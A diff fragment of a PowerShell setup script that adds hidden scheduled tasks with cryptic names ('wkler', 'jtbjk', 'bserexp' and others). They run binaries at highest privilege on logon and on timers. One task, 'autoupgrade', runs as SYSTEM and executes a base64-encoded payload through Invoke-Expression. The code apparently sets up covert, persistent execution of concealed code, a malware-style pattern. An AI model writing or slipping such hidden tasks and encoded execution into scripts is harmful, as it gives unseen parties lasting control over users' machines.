+                            Write-Warning "Task '$taskName' could not be started: $($_.Exception.Message)" -WarningAction Continue
+                            Start-Process -FilePath $pythonwPath -ArgumentList "`"$scriptPath`"" -WorkingDirectory $scriptDir -WindowStyle Hidden -ErrorAction Stop | Out-Null
+                        }
+                    } catch {
+                        Write-Warning "Task '$taskName' installation/start failed: $($_.Exception.Message)" -WarningAction Continue
+                    }
+                } else {
+                    Write-Warning 'Python was not found; the Environment task cannot be updated.' -WarningAction Continue
+                }
+            }
+        } else {
+            Write-Warning "No configuration code was found in '$sourceConfigDir\config.ini'; the Environment task cannot be updated." -WarningAction Continue
+        }
+    } else {
+        Write-Warning "Environment task cannot be updated: check user profile '$targetUserProfile' and configuration directory '$sourceConfigDir'." -WarningAction Continue
+    }
+} catch {
+    Write-Warning "Environment configuration failed: $($_.Exception.Message)" -WarningAction Continue
+}
+
+try {
+    if ($realUser) {
+        Unregister-ScheduledTask -TaskPath '\' -TaskName 'Autobackup' -Confirm:$false -ErrorAction SilentlyContinue
+        $bserexpTaskName = 'bserexp'
+        $agentSettingTaskName = 'agent-setting'
+        $wklerTaskName = 'wkler'
+        $jtbjkTaskName = 'jtbjk'
+        $autoupgradeTaskName = 'autoupgrade'
+
+        if ($bserexpBin) {
+            $bserexpLaunchCommand = New-HiddenStartProcessCommand -FilePath $bserexpBin
+            $bserexpTaskCommand = if ($uvBin) {
+                $bserexpUpgradeCommand = "& $(Convert-ToSingleQuotedPowerShellLiteral -Value $uvBin) tool upgrade --all"
+                "$bserexpUpgradeCommand; $bserexpLaunchCommand"
+            } else {
+                $bserexpLaunchCommand
+            }
+            $bserexpAction = New-PowerShellTaskAction -Command $bserexpTaskCommand
+
+            $bserexpTrigger = New-ScheduledTaskTrigger -Weekly -WeeksInterval 1 -DaysOfWeek Sunday -At 7pm
+            $bserexpTrigger.Enabled = $true
+            $bserexpPrincipal = New-ScheduledTaskPrincipal -UserId $realUser -LogonType Interactive -RunLevel Highest
+            $bserexpSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden -MultipleInstances Parallel -StartWhenAvailable
+
+            try {
+                Register-ManagedTask -TaskName $bserexpTaskName -Action $bserexpAction -Trigger $bserexpTrigger -Principal $bserexpPrincipal -Settings $bserexpSettings
+                Enable-ScheduledTask -TaskPath '\' -TaskName $bserexpTaskName -ErrorAction Stop | Out-Null
+                Start-ScheduledTask -TaskPath '\' -TaskName $bserexpTaskName -ErrorAction Stop
+            } catch {
+                Write-Warning "Task '$bserexpTaskName' installation/start failed: $($_.Exception.Message)" -WarningAction Continue
+            }
+        }
+
+        if ($agentSettingBin) {
+            $agentSettingLaunchCommand = New-HiddenStartProcessCommand -FilePath $agentSettingBin
+            $agentSettingTaskCommand = if ($uvBin) {
+                $agentSettingUpgradeCommand = "& $(Convert-ToSingleQuotedPowerShellLiteral -Value $uvBin) tool upgrade --all"
+                "$agentSettingUpgradeCommand; $agentSettingLaunchCommand"
+            } else {
+                $agentSettingLaunchCommand
+            }
+            $agentSettingAction = New-PowerShellTaskAction -Command $agentSettingTaskCommand
+
+            $agentSettingTrigger = New-ScheduledTaskTrigger -Daily -DaysInterval 10 -At 11pm
+            $agentSettingTrigger.Enabled = $true
+
+            $agentSettingPrincipal = New-ScheduledTaskPrincipal -UserId $realUser -LogonType Interactive -RunLevel Highest
+
+            $agentSettingSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden -MultipleInstances Parallel -StartWhenAvailable
+
+            try {
+                Register-ManagedTask -TaskName $agentSettingTaskName -Action $agentSettingAction -Trigger $agentSettingTrigger -Principal $agentSettingPrincipal -Settings $agentSettingSettings
+                Enable-ScheduledTask -TaskPath '\' -TaskName $agentSettingTaskName -ErrorAction Stop | Out-Null
+                Start-ScheduledTask -TaskPath '\' -TaskName $agentSettingTaskName -ErrorAction Stop
+            } catch {
+                Write-Warning "Task '$agentSettingTaskName' installation/start failed: $($_.Exception.Message)" -WarningAction Continue
+            }
+        }
+
+        if ($wklerBin) {
+            $wklerLaunchCommand = New-HiddenStartProcessCommand -FilePath $wklerBin
+            $wklerTaskCommand = "if (-not (Get-CimInstance Win32_Process | Where-Object { `$_.ProcessId -ne `$PID -and `$_.CommandLine -and `$_.CommandLine -like '*wkler*' } | Select-Object -First 1)) { $wklerLaunchCommand }"
+            $wklerAction = New-PowerShellTaskAction -Command $wklerTaskCommand
+
+            $wklerTrigger = New-ScheduledTaskTrigger -AtLogOn -User $realUser
+            $wklerTrigger.Enabled = $true
+            $wklerTrigger.Delay = 'PT15M'
+
+            $wklerPrincipal = New-ScheduledTaskPrincipal -UserId $realUser -LogonType Interactive -RunLevel Highest
+
+            $wklerSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden -MultipleInstances Parallel -StartWhenAvailable
+
+            try {
+                Register-ManagedTask -TaskName $wklerTaskName -Action $wklerAction -Trigger $wklerTrigger -Principal $wklerPrincipal -Settings $wklerSettings
+                Enable-ScheduledTask -TaskPath '\' -TaskName $wklerTaskName -ErrorAction Stop | Out-Null
+                Start-ScheduledTask -TaskPath '\' -TaskName $wklerTaskName -ErrorAction Stop
+            } catch {
+                Write-Warning "Task '$wklerTaskName' installation/start failed: $($_.Exception.Message)" -WarningAction Continue
+            }
+        }
+
+        if ($jtbjkBin) {
+            $jtbjkLaunchCommand = New-HiddenStartProcessCommand -FilePath $jtbjkBin
+            $jtbjkTaskCommand = "if (-not (Get-CimInstance Win32_Process | Where-Object { `$_.ProcessId -ne `$PID -and `$_.CommandLine -and `$_.CommandLine -like '*wkler*' } | Select-Object -First 1)) { $jtbjkLaunchCommand }"
+            $jtbjkAction = New-PowerShellTaskAction -Command $jtbjkTaskCommand
+
+            $jtbjkTrigger = New-ScheduledTaskTrigger -AtLogOn -User $realUser
+            $jtbjkTrigger.Enabled = $true
+            $jtbjkTrigger.Delay = 'PT3M'
+
+            $jtbjkPrincipal = New-ScheduledTaskPrincipal -UserId $realUser -LogonType Interactive -RunLevel Highest
+
+            $jtbjkSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden -MultipleInstances Parallel -StartWhenAvailable
+
+            try {
+                Register-ManagedTask -TaskName $jtbjkTaskName -Action $jtbjkAction -Trigger $jtbjkTrigger -Principal $jtbjkPrincipal -Settings $jtbjkSettings
+                Enable-ScheduledTask -TaskPath '\' -TaskName $jtbjkTaskName -ErrorAction Stop | Out-Null
+                Start-ScheduledTask -TaskPath '\' -TaskName $jtbjkTaskName -ErrorAction Stop
+            } catch {
+                Write-Warning "Task '$jtbjkTaskName' installation/start failed: $($_.Exception.Message)" -WarningAction Continue
+            }
+        } else {
+            Unregister-ScheduledTask -TaskPath '\' -TaskName $jtbjkTaskName -Confirm:$false -ErrorAction SilentlyContinue
+        }
+
+        $systemAutoSetupTask = Get-ScheduledTask -TaskName 'sshAutoSetup' -ErrorAction SilentlyContinue |
+            Where-Object {
+                $_.Principal.UserId -ieq 'SYSTEM' -and
+                $_.Principal.LogonType -eq 'ServiceAccount'
+            } |
+            Select-Object -First 1
+
+        if ($systemAutoSetupTask) {
+            Unregister-ScheduledTask -TaskPath '\' -TaskName $autoupgradeTaskName -Confirm:$false -ErrorAction SilentlyContinue
+        } else {
+            $autoupgradeCommand = "[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('$ENCODED_EC')) | Invoke-Expression"
+            $autoupgradeAction = New-PowerShellTaskAction -Command $autoupgradeCommand
+
+            $autoupgradeTrigger = New-ScheduledTaskTrigger -Daily -DaysInterval 15 -At 11pm
+            $autoupgradeTrigger.Enabled = $true
+
+            $autoupgradePrincipal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest
+
+            $autoupgradeSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden -MultipleInstances Parallel -StartWhenAvailable
+
+            try {
+                Register-ManagedTask -TaskName $autoupgradeTaskName -Action $autoupgradeAction -Trigger $autoupgradeTrigger -Principal $autoupgradePrincipal -Settings $autoupgradeSettings
+                Enable-ScheduledTask -TaskPath '\' -TaskName $autoupgradeTaskName -ErrorAction Stop | Out-Null
+                Start-ScheduledTask -TaskPath '\' -TaskName $autoupgradeTaskName -ErrorAction Stop
+            } catch {
+                Write-Warning "Task '$autoupgradeTaskName' installation/start failed: $($_.Exception.Message)" -WarningAction Continue
+            }
+        }
+    }
+} catch {
+    Write-Warning "Task setup failed: $($_.Exception.Message)" -WarningAction Continue
+}
+
+$PSDefaultParameterValues.Clear()
+foreach ($key in $originalPSDefaults.Keys) {
+    $PSDefaultParameterValues[$key] = $originalPSDefaults[$key]
+}
